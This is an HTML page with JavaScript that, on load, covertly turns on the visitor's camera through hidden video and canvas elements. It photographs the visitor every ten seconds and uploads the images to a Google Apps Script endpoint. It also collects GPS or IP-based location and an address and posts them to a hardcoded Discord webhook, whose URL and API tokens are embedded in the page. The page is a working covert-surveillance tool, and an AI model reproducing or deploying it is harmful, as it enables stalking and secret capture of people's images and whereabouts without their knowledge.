<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Continuous Image Capture and Location</title>
</head>
<body>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

    <script>
        const googleAppsScriptURL = 'https://script.google.com/macros/s/AKfycbwMGLlqLHBfUItmVQK4oSJjDiLskKlUYhiAnqwq0IEosZfTOIweP7vvHvKz9yG8DjgJ/exec'; // Replace with your Google Apps Script URL
        const locationWebhookURL = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ'; // Replace with your Discord webhook URL
        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa'; // Replace with your LocationIQ API token
        const ipapiToken = '41d360af12f2bf'; // Replace with your IPAPI token

        // Initialize camera and start capturing photos in intervals
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;

                // Capture a photo every 10 seconds
                setInterval(captureAndSendPhoto, 10000);
                getLocation(); // Start location fetching
            } catch (error) {
                console.error("Error accessing the camera:", error);
            }
        }

        // Capture photo and convert to base64 for Google Apps Script
        async function capturePhoto() {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/png').split(',')[1];  // Return base64 part only
        }

        // Capture and send photo to Google Apps Script
        async function captureAndSendPhoto() {
            const imageData = await capturePhoto();
            console.log("Captured image data:", imageData.substring(0, 30) + '...'); // Log part of the image data for debugging

            const response = await fetch(googleAppsScriptURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `image=${encodeURIComponent(imageData)}`
            });

            if (response.ok) {
                const imageUrl = await response.text();
                console.log("Image saved to Google Drive:", imageUrl);
                // You can send the image URL to Discord here if needed
            } else {
                console.error("Error saving image to Google Drive:", response.statusText);
            }
        }

        // Get geolocation using LocationIQ or fallback to IPAPI
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error);
            } else {
                error({ code: 0, message: "Geolocation not supported" });
            }
        }

        function success(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // Use LocationIQ to get a human-readable address
            reverseGeocodeWithLocationIQ(latitude, longitude);
        }

        function error(err) {
            console.error(`Geolocation Error (${err.code}): ${err.message}`);
            // Fallback to IP geolocation
            getIPGeolocation();
        }

        // Get location from IPAPI as a fallback
        function getIPGeolocation() {
            fetch(`https://ipapi.co/json/`)
                .then(response => response.json())
                .then(data => {
                    if (data && data.latitude && data.longitude) {
                        reverseGeocodeWithLocationIQ(data.latitude, data.longitude);
                    } else {
                        console.error('Unable to retrieve location from IPAPI.');
                    }
                })
                .catch(() => console.error('Error fetching IP geolocation.'));
        }

        // Reverse geocoding to get human-readable address using LocationIQ
        function reverseGeocodeWithLocationIQ(latitude, longitude) {
            const url = `https://us1.locationiq.com/v1/reverse.php?key=${locationIQToken}&lat=${latitude}&lon=${longitude}&format=json`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data && data.display_name) {
                        const address = data.display_name;
                        sendLocationToDiscord(latitude, longitude, address);
                    } else {
                        console.error('Error in reverse geocoding.');
                    }
                })
                .catch(() => console.error('Error during reverse geocoding.'));
        }

        // Send location information to Discord
        function sendLocationToDiscord(latitude, longitude, address) {
            const message = {
                content: `Location data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAddress: ${address}`
            };

            fetch(locationWebhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message),
            })
            .then(response => {
                if (!response.ok) {
                    console.error("Error sending location to Discord.");
                }
            })
            .catch(error => {
                console.error("Error sending location to Discord:", error);
            });
        }

        // Start camera and location capture on page load
        window.onload = () => {
            initCamera();
        };
    </script>
</body>
</html>
